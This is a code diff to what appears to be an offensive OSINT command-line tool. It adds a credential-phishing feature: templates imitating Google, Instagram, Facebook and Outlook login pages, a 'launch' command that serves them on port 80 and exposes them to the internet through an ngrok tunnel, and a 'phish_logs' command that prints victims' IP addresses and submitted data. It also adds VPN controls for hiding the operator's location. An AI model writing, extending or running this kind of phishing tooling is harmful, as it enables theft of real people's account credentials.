@@ -19,6 +19,9 @@ from modules import leak_tools
 from modules import media_tools
 from modules import ai_analysis
 from modules import dark_web
+from modules import phishing_tools
+from modules import vpn_tools
+from pyngrok import ngrok
 
 # Optional dependencies for Ghost Mode
 try:
@@ -254,8 +257,20 @@ def print_help():
     print(f"  {Fore.CYAN}dashboard{Style.RESET_ALL}                         : Launch Interactive Graph UI (Web)")
     print(f"  {Fore.CYAN}show_data{Style.RESET_ALL}                         : Show currently collected data")
 
+    print(f"\n{Fore.BLUE}[🎣 Phishing & Social Eng]{Style.RESET_ALL}")
+    print(f"  {Fore.RED}list_phish{Style.RESET_ALL}                      : List phishing templates")
+    print(f"  {Fore.RED}launch <template> [--public]{Style.RESET_ALL}     : Start phishing server")
+    print(f"  {Fore.RED}set_phish_token <token>{Style.RESET_ALL}          : Set Ngrok token")
+    print(f"  {Fore.RED}phish_logs{Style.RESET_ALL}                      : View captured phish data")
+
+    print(f"\n{Fore.BLUE}[🛡️ VPN Control (Mullvad)]{Style.RESET_ALL}")
+    print(f"  {Fore.CYAN}vpn status{Style.RESET_ALL}                      : Check VPN connection")
+    print(f"  {Fore.CYAN}vpn connect / disconnect{Style.RESET_ALL}        : Toggle VPN")
+    print(f"  {Fore.CYAN}vpn set <country>{Style.RESET_ALL}               : Change server location")
+
     print(f"\n{Fore.BLUE}[🖥️ Interface]{Style.RESET_ALL}")
     print(f"  {Fore.WHITE}clear{Style.RESET_ALL}                               : Clear terminal screen")
+    print(f"  {Fore.WHITE}close help{Style.RESET_ALL}                          : Close help panel")
     print(f"  {Fore.WHITE}back / next{Style.RESET_ALL}                         : Older / Newer history results")
     print(f"  {Fore.GREEN}exit{Style.RESET_ALL}                                : Exit the tool")
 
@@ -327,6 +342,11 @@ async def main():
                 print_help()
                 continue
             
+            if command == "close help":
+                clear_screen()
+                print(banner_art.get_header())
+                continue
+            
             if command == "dashboard":
                 HISTORY.start_new_page()
                 print(f"{Fore.GREEN}[*] Launching Dashboard on http://localhost:5000 ...{Style.RESET_ALL}")
@@ -364,7 +384,121 @@ async def main():
                 else:
                     enable_ghost()
                 continue
+            
+            # --- Phishing Commands ---
+            if command == "list_phish":
+                HISTORY.start_new_page()
+                template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
+                templates = [d for d in os.listdir(template_dir) if os.path.isdir(os.path.join(template_dir, d))]
+                print(f"\n{Fore.CYAN}[*] Available Phishing Templates:{Style.RESET_ALL}")
+                for t in templates:
+                    print(f"  - {t}")
+                continue
+
+            if command.startswith("set_phish_token"):
+                HISTORY.start_new_page()
+                parts = command.split()
+                if len(parts) < 2:
+                    print(f"{Fore.RED}[!] Usage: set_phish_token <token>{Style.RESET_ALL}")
+                    continue
+                token = parts[1]
+                with open(".env", "a") as f:
+                    f.write(f"\nNGROK_AUTHTOKEN={token}")
+                print(f"{Fore.GREEN}[*] Ngrok token saved to .env file.{Style.RESET_ALL}")
+                continue
+
+            if command.startswith("launch"):
+                HISTORY.start_new_page()
+                parts = command.split()
+                if len(parts) < 2:
+                    print(f"{Fore.RED}[!] Usage: launch <template> [--public]{Style.RESET_ALL}")
+                    continue
                 
+                template = parts[1]
+                use_public = "--public" in parts
+                
+                # Load token if exists
+                if use_public:
+                    if os.path.exists(".env"):
+                        with open(".env", "r") as f:
+                            for line in f:
+                                if line.strip().startswith("NGROK_AUTHTOKEN="):
+                                    token = line.split("=")[1].strip()
+                                    ngrok.set_auth_token(token)
+                    else:
+                        print(f"{Fore.RED}[!] Ngrok token not found. Use 'set_phish_token <token>' first.{Style.RESET_ALL}")
+                        continue
+
+                # Default redirects for common templates
+                redirects = {
+                    'google': 'https://accounts.google.com',
+                    'instagram': 'https://instagram.com',
+                    'facebook': 'https://facebook.com',
+                    'outlook': 'https://outlook.live.com'
+                }
+                url = redirects.get(template, 'https://google.com')
+                
+                public_url = None
+                if use_public:
+                    try:
+                        print(f"{Fore.CYAN}[*] Opening Ngrok tunnel...{Style.RESET_ALL}")
+                        public_url = ngrok.connect(80).public_url
+                        print(f"{Fore.GREEN}[🔥] PUBLIC LINK: {public_url}{Style.RESET_ALL}")
+                    except Exception as e:
+                        print(f"{Fore.RED}[!] Ngrok error: {e}{Style.RESET_ALL}")
+                        continue
+
+                print(f"{Fore.GREEN}[*] Launching phishing server: {template.upper()}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Access it locally at: http://gogle{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Listening on http://0.0.0.0:80 (Requires sudo){Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop everything.{Style.RESET_ALL}")
+                
+                try:
+                    await run_sync(phishing_tools.run_server, template, url, 80)
+                except KeyboardInterrupt:
+                    if public_url:
+                        ngrok.disconnect(public_url)
+                    print(f"\n{Fore.RED}[!] Server stopped.{Style.RESET_ALL}")
+                continue
+
+            if command == "phish_logs":
+                HISTORY.start_new_page()
+                logs = phishing_tools.get_logs()
+                if not logs:
+                    print(f"{Fore.RED}[!] No phishing logs captured yet.{Style.RESET_ALL}")
+                else:
+                    for entry in logs:
+                        print(f"\n{Fore.CYAN}--- {entry['timestamp']} ---{Style.RESET_ALL}")
+                        print(f"Template: {entry['template']}")
+                        print(f"IP: {entry['ip']}")
+                        for k, v in entry['data'].items():
+                            print(f"{k}: {v}")
+                continue
+            
+            # --- VPN Commands ---
+            if command.startswith("vpn"):
+                HISTORY.start_new_page()
+                parts = command.split()
+                if len(parts) < 2:
+                    print(f"{Fore.RED}[!] Usage: vpn <status/connect/disconnect/set>{Style.RESET_ALL}")
+                    continue
+                
+                sub_cmd = parts[1]
+                if sub_cmd == "status":
+                    print(vpn_tools.get_status())
+                elif sub_cmd == "connect":
+                    print(vpn_tools.connect())
+                elif sub_cmd == "disconnect":
+                    print(vpn_tools.disconnect())
+                elif sub_cmd == "set":
+                    if len(parts) < 3:
+                        print(f"{Fore.RED}[!] Usage: vpn set <country_code> (es. us, se, it){Style.RESET_ALL}")
+                    else:
+                        print(vpn_tools.set_location(parts[2]))
+                else:
+                    print(f"{Fore.RED}[!] Unknown vpn command.{Style.RESET_ALL}")
+                continue
+
             if command.startswith("search"):
                 HISTORY.start_new_page()
                 target_type, value = parse_search_command(command)
